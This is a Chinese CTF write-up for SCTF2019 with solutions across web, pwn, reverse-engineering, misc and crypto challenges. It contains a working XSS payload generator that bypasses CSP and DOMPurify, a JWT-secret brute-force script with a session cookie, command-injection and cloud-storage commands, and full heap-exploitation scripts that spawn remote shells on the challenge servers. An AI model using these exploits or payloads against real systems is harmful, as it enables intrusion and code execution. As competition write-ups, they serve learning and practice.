---
title: SCTF2019-WriteUp
author: kn0ck
comment: true
date: 2019-06-25 15:08:49
tags:
- CTF
- WriteUp
- SCTF2019
categories:
- CTF
---

> 感谢Syclover师傅们的题目。
> 比赛体验良好，最终国内第五名。
> 以下为我们的WP。

<!--more-->


## WEB



### math-is-fun1 & math-is-fun2

XSS绕过CSP和DOMpurify，看样子hint给的通过数学公式这块下手。

首先看一下CSP：

```
Content-Security-Policy: 
	  font-src cdnjs.cloudflare.com 'self';    
    script-src 'self' 'nonce-3fna6ZTUPOk=' 'strict-dynamic' 'unsafe-eval';    
    style-src 'self' 'unsafe-inline';    
    child-src 'none';    
    object-src 'none'; 
    base-uri 'self' 'nonce-3fna6ZTUPOk=';    
    connect-src 'self';    
    sandbox allow-scripts allow-modals allow-same-origin;    
    default-src 'self';
```

可以发现js有nonce做验证，但是又采取了`strict-dynamic`,所以，便可以通过动态加载js来绕过nonce。

然后进一步对网站测试，发现以下漏洞隐患点：

> 整理一下已知点：
>
> 1. get传text，可以通过js覆盖textarea
> 2. get传name，会作为window.config的值 。 通过换行，进而**可以修改任意****全局变量**
> 3. 有一个jsonp接口。
> 4. 应该需要从math这里找突破点。
> 5. 应该还需要绕过DOMPurify。（貌似所有输入全调这个接口了）



然后进行猜测，应该是要**通过2来修改MathJax的配置，从而加载任意js文件，此时引入jsonp来实现xss。**

尝试修改jax的根路径，但是该处修改在引入MathJax之前，导致Hub改不了。改Ajax的话，会额外添加一个AuthorConfig字段，貌似不生效、

如下payload：

```
name=123%0aMathJax['Ajax']={"config":{"root":"http://47.110.128.101/5am3test"}}
```

可以看到

![20190624156134810069567.jpg](https://img.5am3.com/20190624156134810069567.jpg)



此时在这个AuthorConfig卡了许久，查阅资料也没找到啥。最终无奈之下，找源头，翻了一下MathJax的源码，对AuthorConfig进行搜索，找到以下点，然后顿时思路清晰，构造payload即可。

![20190624156134827062364.png](https://img.5am3.com/20190624156134827062364.png)



最后利用时，发现jsonp接口还有个waf，对引号进行了过滤，此时用eval+fromCharCode绕过即可，最终poc如下。

```python
#coding:utf-8

import sys

def getPayload(evaljs):
	p = "http://47.110.128.101/config?callback="
	payload='eval(String.fromCharCode('
	for i in range(len(evaljs)):
		payload+=str(ord(evaljs[i]))
		if(i+1<len(evaljs)):
			payload+=','
	payload+='));//'
	payload+=""
	test = "http://47.110.128.101/challenge?name=abcd%0aMathJax[%27root%27]%3d"
	payload = test+p+payload+"%26/"
	print("[payload] "+payload)
	return 


if __name__ == '__main__':

	arg = sys.argv[2]
	getPayload(arg)
	
```

第二题依旧一样，通杀的payload。



### easyweb



login登入由js进行校验，所以登入主要从js下手，配置一下burpsuite的抓包规则

![20190624156134842162539.png](https://img.5am3.com/20190624156134842162539.png)



抓取访问[https://sctf2019.l0ca1.xyz/#/](USER_CANCEL)main 交互的response返回包，修改response里面的requreiLogin的值为0，也就是修改为不需要登录直接进后台



![20190624156134843859268.png](https://img.5am3.com/20190624156134843859268.png)

进入后台后是一个JSON打包的点，思路也就是通过构造JSON数据，在打包过程中触发命令执行

![20190624156134845186761.png](https://img.5am3.com/20190624156134845186761.png)

随便填些数据进行测试，抓取数据包分析一下

![20190624156134846221741.png](https://img.5am3.com/20190624156134846221741.png)

可以发现有给一个key：abcdefghiklmn123，应该是一个校验位，放那就好了，主要是构造npm的数据，思路是进行命令执行，所以可以构造出一个命令执行语句，命令执行没有回显，可以通过vps的log获取数据进行回显，构造命令注入的payload



![20190624156134848622476.png](https://img.5am3.com/20190624156134848622476.png)

可以在vps上获取到asound.conf的数据信息

![20190624156134850099282.png](https://img.5am3.com/20190624156134850099282.png)

```
#
# Place your global alsa-lib configuration here...
#

@hooks [
	{
		func load
		files [
			"/etc/alsa/pulse-default.conf"
		]
		errors false
	}
]
```

本以为命令注入就解出来了，万万没想到怎么都没找到flag，也就是说还有一层考点......

查阅资料找到：https://www.anquanke.com/post/id/170596

serveless执行

```bash
curl -X POST -H "Content-Type: application/json" https://us-east1-slsbot-214001.cloudfunctions.net/gcp-py-explore --data '{"ls":"./"}' | base64 --decode
```

可以列出云上的一些文件,依然还没有找到flag。

于是本地装一下awscli 配下token看看吧

<https://www.anquanke.com/post/id/170342>

```bash
aws s3 cp s3://static.l0ca1.xyz/flaaaaaaaaag/flaaaag.txt ./flag.txt --region ap-northeast-1
```





### Flag Shop

通过 <http://47.110.15.101/robots.txt> 得到 <http://47.110.15.101//filebak>  进一步得到源码

分析源码，发现隐患点(没个卵用，还非要写上)

```ruby
unless params[:SECRET].nil?
  puts "[ma1] "+"#{params[:SECRET].match(/[0-9a-z]+/)}"
  if secret.match("#{params[:SECRET].match(/[0-9a-z]+/)}")
    puts "[flag] "+flag
  end
end
```



猜测是通过某种缺陷，来对secret进行盲注，进而读取secret，伪造 token，getflag？ 

 核心的代码是上面这里， 但如何才能构造盲注？

一开始怀疑是正则的效率问题，但是此接口仅允许get方式，对url长度有限制。

最终查阅资料可以发现ruby有几个全局变量。其中$&表示最近一次与正则表达式匹配的字符串。此时搭配之前一直很迷的SECRET，便可以爆破SECRET，脚本如下

```python
import requests

url = "http://47.110.15.101/work?name=%3C%25%3d$%26%25%3E&do=%3C%25%3d$%26%25%3E+is+working&SECRET={SECRET}"

SECRET ="ec55ce17b51f7f2588b3d2f09c821e6499984b09810e652ce9fa4882fe4875c8"


headers = {
	"Cookie": "auth=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJhMDc4ZDU3ZC0wZjZmLTRhNTItODE1MC0yMGYyOTkzYzkxMTUiLCJqa2wiOjI4fQ.gQnZDaa3pKpldiD07vWsX65SO4Ioz5ZawOy5xJPNSEU;"
}

zidian="1234567890qwertyuiopasdfghjklzxcvbnm"
for jj in range(30):
	for i in zidian:
		test = SECRET + i
		# test = i + SECRET
		crackUrl = url.replace("{SECRET}",test)
		text = requests.get(crackUrl,headers=headers).text
		if("'"+test+" " in text):
			SECRET = test
			print("[SECRET] " + SECRET)
			break

```



然后直接伪造jwt就可以了，有了key直接去那个神奇的网站就行了。最终在cookie中读出flag



## PWN

### one_heap



漏洞点free后指针未清0

首先爆破heap地址，攻击tcache。然后在tcache上爆破stdout地址用来泄露libc。最后将free hook改成system

```python
from PwnContext import *
if __name__ == '__main__':
    context.terminal = ['tmux', 'split', '-h']
    #-----function for quick script-----#
    s       = lambda data               :ctx.send(str(data))        #in case that data is a int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    st      = lambda delim,data         :ctx.sendthen(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    leak    = lambda address, count=0   :ctx.leak(address, count)
    
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))

    debugg = 0
    logg = 0

    ctx.binary = './one_heap'

    ctx.symbols = {'ptr':0x202050}
    #ctx.custom_lib_dir = '/glibc/x64/2.26/lib/'
    #ctx.debug_remote_libc = True
    #ctx.debug()

    while 1:
        try:
            if debugg:
                rs()
            else:
                ctx.remote = ('47.104.89.129', 10001)
                rs(method = 'remote')

            if logg:
                context.log_level = 'debug'

            def choice(num):
                sla('choice:',num)

            def add(asize,acon):
                choice(1)
                sla('size:',asize)
                if len(acon) < asize:
                    sla('content:',acon)
                else:
                    sa('content:',acon)
            def free():
                choice(2)
            
            add(0x70,'AAA')
            free()
            free()
            if debugg:
                if p64(ctx.bases.heap)[1] != '\x70':
                    print hex(ctx.bases.heap)
                    ctx.close()
                    continue
            
            add(0x70,p16(0x7010))
            add(0x70,'')
            add(0x70,p64(0)*4+'\x00'*3+'\x07')
            free()
            #0x7ffff7dd0780
            #add(0x40,'\x00'*2+'\x07'+'\x00'*3+'\x07'+'\x00')
            add(0x40,'\x00')
            fake = 0xb770
            
            if debugg:
                if p64(ctx.bases.libc+0x3ec760+0x10)[:2]!='\x70\xb7':
                    ctx.close()
                    continue

            add(0x10,p64(0)+p32(fake)[:2])
            free()
            add(0x50,p32(fake+0x10)[:2])
            #ctx.debug()
            the_bytes = '\x70'
            add(0x40,the_bytes)
            sl(1)
            sleep(0.1)
            sl(0x70)
            sleep(0.1)
            sl(the_bytes)
            #ctx.debug()
            libc_base = uu64(r(6)) - 0x3ec770
            log.success("libc_base = %s"%hex(libc_base))
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
            save_text_base = libc_base + 0x61a170
            malloc_hook = libc_base + libc.symbols['__malloc_hook']
            free_hook = libc_base + libc.symbols['__free_hook']
            system = libc_base + libc.symbols['system']
            stdout = libc_base + 0x3ec760
            
            add(0x18,p64(malloc_hook-8)+p64(free_hook)+p64(stdout+0x10))
            add(0x50,p64(save_text_base)+p64(libc_base+0x3ec7e3)+p64(save_text_base)+p64(save_text_base+6))
            text_base = uu64(r(6))
            log.success("text_base = %s"%hex(text_base))
            to_call_free = text_base + 0xDAE
            add(0x40,p64(system+27))
            add(0x30,'/bin/sh\x00'+p64(to_call_free))
            #ctx.debug()
            """
            add(0x18,p64(malloc_hook))
            one = libc_base + 0x4f2c5
            log.success("one = %s"%hex(one))
            add(0x30,p64(one))
            """
            choice(1)
            sla('size:',1)
            #ctx.debug()
            irt()
            break
        except KeyboardInterrupt:
            exit()
        except:
            if ctx.io:
                ctx.close()
            pass
```



### two_heap

漏洞点free后指针未清0

%a%a%a%a%a 双精度16字节可以泄露libc，然后利用0x20大小的chunk可以分配四个来攻击free hook即可。

```python
from PwnContext import *
if __name__ == '__main__':
    context.terminal = ['tmux', 'split', '-h']
    #-----function for quick script-----#
    s       = lambda data               :ctx.send(str(data))        #in case that data is a int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    st      = lambda delim,data         :ctx.sendthen(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    leak    = lambda address, count=0   :ctx.leak(address, count)
    
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))

    debugg = 0
    logg = 0

    ctx.binary = './two_heap'

    #if debugg:
    #	ctx.custom_lib_dir = '/glibc/x64/2.26/lib/'
    #else:
    #	ctx.custom_lib_dir = '/glibc/x64/2.26/lib/'#remote libc
    ctx.remote_libc = './libc-2.26.so'
    ctx.debug_remote_libc = True


    ctx.symbols = {'heap':0x4020}
    #ctx.breakpoints = [0x1234, 0x5678]
    #ctx.debug()

    if debugg:
        rs()
    else:
        ctx.remote = ('47.104.89.129', 10002)
        rs(method = 'remote')

    if logg:
        context.log_level = 'debug'

    def choice(num):
        sla('choice:',num)
    def add(asize,acon):
        choice(1)
        sla('size:',asize)
        sla('note:',acon)
    def free(aid):
        choice(2)
        sla('index:',aid)


    sla('SCTF:','%a%a%a%a%a')
    ru('0x0p+00x0p+00x0.0')
    libc_base = (int(ru('p'),16) << 4) - 0x18b720
    log.success("libc_base = %s"%hex(libc_base))
    libc = ELF('./libc-2.26.so')
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    free_hook = libc_base + libc.symbols['__free_hook']
    free_hook = libc_base + 0x18d5a8
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    system = libc_base + libc.symbols['system']
    system = libc_base + 0x21f80
    add(0x60,'/bin/sh\x00')
    add(0x30,'111')
    choice(1)
    sla('size:',0)#2
    free(2)
    free(2)
    add(0x10,p64(free_hook))
    log.success("free_hook = %s"%hex(free_hook))
    add(8,'AAA')
    add(0x18,p64(system))
    free(0)

    #ctx.debug()
    irt()
```



### easy_heap

 这个pwn题漏洞很明显，在0xe2d处，看见该读函数存在一字节溢出，该字节为0。

```c
unsigned __int64 __fastcall some_read_nterm_0end(char *dst, unsigned __int64 len)
{
  char buf; // [rsp+13h] [rbp-Dh]
  int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i < len; ++i )
  {
    if ( read(0, &buf, 1uLL) <= 0 )
    {
      perror("Read failed!\n");
      exit(-1);
    }
    if ( buf == 10 )
      break;
    dst[i] = buf;
  }
  if ( i == len )
    dst[i] = 0;
  return __readfsqword(0x28u) ^ v5;
}
```



结合程序本身，只有程序基地址的泄露，以及mmap分配的可读/写/执行段的地址，没有libc或者堆栈地址。由此大致可猜测这个是需要最终执行shellcode的。

首先可以使用一字节溢出进行unlink攻击，由此获取任意写的能力，将shellcode写入mmap段，然后就需要考虑如何劫持控制流。

由于给的libc是2.23版本，该版本是没有对_IO_File结构体的vtable进行检查的，所以这个可以通过篡改unsorted bin的bk指针至_IO_list_all-0x10处，导致_IO_list_all被篡改，最终进行一个经典的文件结构体伪造，vtable即指向我们可控的程序段，里面则写上mmap段地址，当出现堆错误打印信息时，即可触发。

```python
from PwnContext import *
if __name__ == '__main__':
    context.terminal = ['tmux', 'split', '-h']
    context.log_level = 'debug'
    #-----function for quick script-----#
    s       = lambda data               :ctx.send(str(data))        #in case that data is a int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    st      = lambda delim,data         :ctx.sendthen(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    leak    = lambda address, count=0   :ctx.leak(address, count)
    
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))
    
    ctx.binary = './easy_heap'
    ctx.remote = ('132.232.100.67', 10004)
    
    ctx.custom_lib_dir = '/root/share/project/glibc-all-in-one/libs/2.23-0ubuntu11_amd64'
    #ctx.remote_libc = './libc.so.6'
    ctx.debug_remote_libc = True
    
    ctx.symbols = {
        'lst':0x202060,
        'cnt':0x202040,
    }
    def add(size):
        sl(1)
        sla('Size', size)
        ru('Address ')
        addr = int(ru('\n'), 16)
        return addr
        
    def free(idx):
        sl(2)
        sla('Index', idx)
        
    def fill(idx, content):
        sl(3)
        sla('Index', idx)
        sa('Content', content)
        
    
    while True:
        try:
            rs('remote')
            #ctx.debug(gdbscript='c')
            
            ru('Mmap: ')
            mmap_addr = int(ru('\n'), 16)
            
            prog_base = add(0xf8) - 0x202068
            add(0xf0)
            
            add(0x20)
            
            target = prog_base+0x202068
            payload1 = p64(0) + p64(0xf1)
            payload1 += p64(target-0x18) + p64(target-0x10)
            payload1 = payload1.ljust(0xf0, '\0')
            payload1 += p64(0xf0)
            fill(0, payload1)
            
            #unlink 
            free(1)
            
            def vuln_write(addr, content):
                payload = p64(0) + p64(0)
                payload += p64(0xf8) + p64(prog_base+0x202050)
                payload += p64(0x1000) + p64(addr)
                fill(0, payload + '\n')
                sleep(0.5)
                fill(1, content + '\n')
                
            
            vuln_write(mmap_addr, asm(shellcraft.sh()))
            
            add(0x20)
            
            payload2 = p64(0) + p64(0)
            payload2 += p64(0xf8) + p64(prog_base+0x202050)
            payload2 += p64(0) + p64(0)
            payload2 += p64(0) + p64(0)
            payload2 += p64(8) + '\x48'
            fill(0, payload2 + '\n')
            fill(3, '\x61\x00\n')
            
            
            payload3 = p64(0) + p64(0)
            payload3 += p64(0xf8) + p64(prog_base+0x202050)
            payload3 += p64(0) + p64(0)
            payload3 += p64(0) + p64(0)
            payload3 += p64(8) + '\x58'
            fill(0, payload3 + '\n')
            fill(3, '\x10\x75\n')
            
            
            payload4 = p64(0) + p64(0)
            payload4 += p64(0xf8) + p64(prog_base+0x202050)
            payload4 += p64(0) + p64(0)
            payload4 += p64(0) + p64(0)
            payload4 += p64(0x1000) + '\x60'
            fill(0, payload4 + '\n')


            fake_vtable = prog_base + 0x202070
            payload5 = p64(2) + p64(3)
            payload5 = payload5.ljust(0xb8,'\x00')
            payload5 += p64(fake_vtable)
            
            fill(3, payload5 + '\n')
            
            payload6 = p64(0) + p64(0)
            payload6 += p64(0xf8) + p64(prog_base+0x202050)
            payload6 += p64(mmap_addr) * 8
            fill(0, payload6 + '\n')
            
            #now trigger
            sleep(0.1)
            sl(1)
            sla('Size', 1)
            sleep(0.1)
            if ctx.connected():
                irt()
        except EOFError:
            pass
```



## RE

### Crackme

有个全局字符串，不运行值不是这个的：
nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo=

```python
from Crypto.Cipher import AES
import base64
iv = b'\x00'*16
key = 'sycloversyclover'
mode = AES.MODE_CBC
cryptos = AES.new(key, mode, iv)
a = b'sctf'*4
raw = cryptos.decrypt(base64.b64decode('nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo='))
flag = b''
for i in range(16):
    flag += bytes(chr(a[i] ^ raw[i]), encoding='utf-8')
flag += raw[16:].replace(b'\x05', b'')
print(flag)
```





### babyre



题目总共分为三个关卡，解出三个关卡就可以得到flag

第一关是一个迷宫，共分为5层

![20190624156134900767013.png](https://img.5am3.com/20190624156134900767013.png)



wasd分别上下左右，x是上一层，y是下一层。

密码：ddwwxxssxaxwwaassyywwdd

第二层是一个base64的解密函数，由于不是逆向选手，傻傻地怼汇编了好久，发现是base64

于是，将sctf_9102字符串base64加密就得到pass了。c2N0Zl85MTAy，但是，我用c2N0Zl85MTAyCg也是可以过的，

第三层是sm4的魔改，我还原了一下这个加密，由于对称加密，不带秘钥，实际将给定的字符串反过来，再加密就是明文了



![20190624156134902133599.png](https://img.5am3.com/20190624156134902133599.png)

其实也可以，将反过来的字符串输入至第三关中，从内存dump下加密的结果，有兴趣可以试下。



### Strange apk

Apk脱壳：容易观察到apk使用第一代dex落地加载加固保护技术，解密算法为简单的异或。

![20190624156134920084292.png](https://img.5am3.com/20190624156134920084292.png)

![20190624156134921258930.png](https://img.5am3.com/20190624156134921258930.png)



观察到flag为30个字符，前十二个字符base64加密后未“**c2N0ZntXM2xjMG1l**”，明文为“sctf{W3lc0me”，后面18个字符会被传到其他activity。

![20190624156134923825127.png](https://img.5am3.com/20190624156134923825127.png)

后18个字符验证逻辑如下，encode函数参数一为该18个字符，参数二为syclover进行md5加密后的结果。分析后发现只需要将"~8t808_8A8n848r808i8d8-8w808r8l8d8}8"中所有的‘8’去掉即可，与前面的结果拼接故得到flag为“sctf{W3lc0me~t0_An4r0id-w0rld}”

![20190624156134925922058.png](https://img.5am3.com/20190624156134925922058.png)

![2019062415613492699126.png](https://img.5am3.com/2019062415613492699126.png)



### Music

主activity只有没用的听音乐功能，是为了浪费调试时间的。直接修改入口类为Main2Activity。接着分析发现，程序执行成功与否取决于f变量。

![20190624156134929292773.png](https://img.5am3.com/20190624156134929292773.png)

逻辑很简单，可以观察出a方法使用的变形版的rc4加密算法，加密后需要与某字符串相等（资源定位到改字符串为“C28BC39DC3A6C283C2B3C39DC293C289C2B8C3BAC29EC3A0C3A7C29A1654C3AF28C3A1C2B1215B53”）



![20190624156134932299445.png](https://img.5am3.com/20190624156134932299445.png)



![20190624156134934463943.png](https://img.5am3.com/20190624156134934463943.png)





至于rc4加密的第二个参数就是key，直接用JEB动态调试得到 

> E7E64BF658BAB14A25C9D67A054CEBE5

唯一的坑点就是RC4算法

`v3_1[v6] = ((char)(v2_1[v6] - v4 ^ (((char)v1[(v1[v4] + v1[v4] % v8) % v8]))));`

这一行代码进行了变形，同时涉及到运算符优先级问题，将其改为

`v3_1[v6] = (char)((v2_1[v6] ^ (((char)v1[(v1[v4] + v1[v4] % v8) % v8])))+ v4 );`

再进行RC4解密即可成功得到flag





## MISC

### 签到

不知道谁签的….

### 头号玩家  

飞机一直往前开，开出去左上方显示flag，emmm，只要游戏打得好



![20190624156136139462352.png](https://img.5am3.com/20190624156136139462352.png)



### Maaaaaaze 

最终是4056

处理一下网页然后算就完事了





```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

from bs4 import BeautifulSoup


length=100
width=100
maze = [[[1,1,1,1] for j in range(width)]for i in range(length)]
visited = [[0 for j in range(width)]for i in range(length)]
mlength = 0
mnode = (0,0)

def dfs(i, j, depth):
 global mlength
 # print (i,j)
 # print maze[i][j]
 visited[i][j]=1
 # print [visited[i-1][j], visited[i][j+1], visited[i-1][j], visited[i][j-1]]
 while True:
  test = 0
  ti = 0
  tj = 0
  if maze[i][j][0] and not visited[i-1][j]:
   test += 1
   ti = -1
  if maze[i][j][1] and not visited[i][j+1]:
   test += 1
   tj = 1
  if maze[i][j][2] and not visited[i+1][j]:
   test += 1
   ti = 1
  if maze[i][j][3] and not visited[i][j-1]:
   test += 1
   tj = -1
  if test == 1:
   i+=ti
   j+=tj
   depth+=1
   visited[i][j]=1
  else: 
   break

 
 if depth>mlength:
  global mnode
  mlength = depth
  mnode = (i,j)
 if maze[i][j][0] and not visited[i-1][j]:
  dfs(i-1,j,depth+1)
 if maze[i][j][1] and not visited[i][j+1]:
  dfs(i,j+1,depth+1)
 if maze[i][j][2] and not visited[i+1][j]:
  dfs(i+1,j,depth+1)
 if maze[i][j][3] and not visited[i][j-1]:
  dfs(i,j-1,depth+1)


if __name__ == '__main__':
 sourse = open('./Maze.html').read()
 soup = BeautifulSoup(sourse,"html.parser")
 result = soup.select('td')
 # print result
 style = [i.get("style") for i in result]
 for i in range(length):
  for j in range(width):
   k = i*width+j
   if k>len(style):
    break
   walls = style[k]
   if u'border-top' in walls:
    maze[i][j][0] = 0
   if u'border-right' in walls:
    maze[i][j][1] = 0
   if u'border-bottom' in walls:
    maze[i][j][2] = 0
   if u'border-left' in walls:
    maze[i][j][3] = 0

 # print maze
 dfs(0,0,1)
 print mlength
 print mnode
 # print visited
 visited = [[0 for j in range(width)]for i in range(length)]
 dfs(mnode[0],mnode[1],1)
 print mlength
 print mnode
```



## CRYPTO

### Warmup

打开发现AES加密有两个条件语句 一个是msg的判断一个code的判断。发现需要对msg做CBC字节翻转，翻转后得到

706c656173652073656e64206d6520796f757220666c616700000000000000003b1c5a0d0f0658502b6124xxxxxxxxxxx

然后nc输入code即可

![20190624156134945857803.png](https://img.5am3.com/20190624156134945857803.png)









